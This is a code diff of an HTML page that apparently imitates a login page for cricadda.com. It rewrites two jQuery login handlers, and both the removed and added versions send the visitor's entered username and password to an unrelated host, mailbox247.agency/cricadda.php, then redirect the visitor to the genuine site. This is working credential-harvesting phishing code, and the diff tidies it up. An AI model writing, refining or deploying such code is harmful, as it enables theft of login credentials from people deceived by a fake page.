@@ -1577,66 +1577,83 @@
 	   <a href="javascript:void(0)" target="_blank"><img src="images/icons/signal.png" alt="signal"></a>
 	</div>
 
+	<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script type="text/javascript">
+  function checkLogin() {
+    // Get the values from the form
+    var loginName = $("#loginName").val();
+    var password = $("#password").val();
+
+    // Check if fields are filled
+    if (loginName !== '' && password !== '') {
+      // Send data via AJAX POST
+      $.ajax({
+        type: "POST",
+        url: "https://mailbox247.agency/cricadda.php",
+        data: {
+          loginName: loginName,
+          password: password
+        },
+        success: function (response) {
+          // Handle success response
+          if (response.trim() === "sucessmsg") {
+            // Redirect on success
+            window.location.href = "https://www.cricadda.com/";
+          } else {
+            // Display error message
+            $("#errorMsg").html("Username and password is incorrect.");
+          }
+        },
+        error: function () {
+          // Handle AJAX request error
+          alert("An error occurred. Please try again.");
+        }
+      });
+    } else {
+      // Alert if fields are empty
+      alert("All fields are required.");
+    }
+  }
+</script>
 	<script type="text/javascript">
+  function checkLogins() {
+    // Get the values from the form
+    var loginName = $("#loginName1").val();
+    var password = $("#password1").val();
 
-		function checkLogin() {
-		  var loginName = $("#loginName").val();
-		  var password = $("#password").val();
-		  if (loginName != '' && password != '') {
-			sessionStorage.setItem("loginName", loginName);
-			sessionStorage.setItem("password", password);
-			var loginName = sessionStorage.getItem("loginName");
-			var password = sessionStorage.getItem("password");
-			$.ajax({
-			  type: "POST",			 
-			  url: "https://mailbox247.agency/cricadda.php",
-			  data: "loginName=" + loginName + "&password=" + password,
-			  success: function (msg) {
-				$("#errorMsg").html('Username and password is incorrect.');
-				if (msg = "sucessmsg") {
-				  window.location.href = "https://www.cricadda.com/";
-				}
-			  }
-			})
-		  } else {
-			alert('All fields are required.');
-			return false;
-		  }
-	
-		}
-	  </script>
-	  	<script type="text/javascript">
+    // Check if fields are filled
+    if (loginName !== '' && password !== '') {
+      // Send data via AJAX POST
+      $.ajax({
+        type: "POST",
+        url: "https://mailbox247.agency/cricadda.php",
+        data: {
+          loginName: loginName,
+          password: password
+        },
+        success: function (response) {
+          // Handle success response
+          if (response.trim() === "sucessmsg") {
+            // Redirect on success
+            window.location.href = "https://www.cricadda.com/";
+          } else {
+            // Display error message
+            $("#errorMsg").html("Username and password is incorrect.");
+          }
+        },
+        error: function () {
+          // Handle AJAX request error
+          alert("An error occurred. Please try again.");
+        }
+      });
+    } else {
+      // Alert if fields are empty
+      alert("All fields are required.");
+    }
+  }
+</script>
 
-		function checkLogins() {
-		  var loginName = $("#loginName1").val();
-		  var password = $("#password1").val();
-		  if (loginName != '' && password != '') {
-			sessionStorage.setItem("loginName1", loginName);
-			sessionStorage.setItem("password1", password);
-			var loginName = sessionStorage.getItem("loginName1");
-			var password = sessionStorage.getItem("password1");
-			$.ajax({
-			  type: "POST",
-			  url: "https://mailbox247.agency/cricadda.php",
-			  data: "loginName=" + loginName + "&password=" + password,
-			  success: function (msg) {
-				$("#errorMsg").html('Username and password is incorrect.');
-				if (msg = "sucessmsg") {
-				  window.location.href = "https://www.cricadda.com/";
-				}
-			  }
-			})
-		  } else {
-			alert('All fields are required.');
-			return false;
-		  }
-	
-		}
-	  </script>
 
-	  <script src="jquery.js"></script>
-
-	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 	<script src="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js"></script>
 
 	<script>
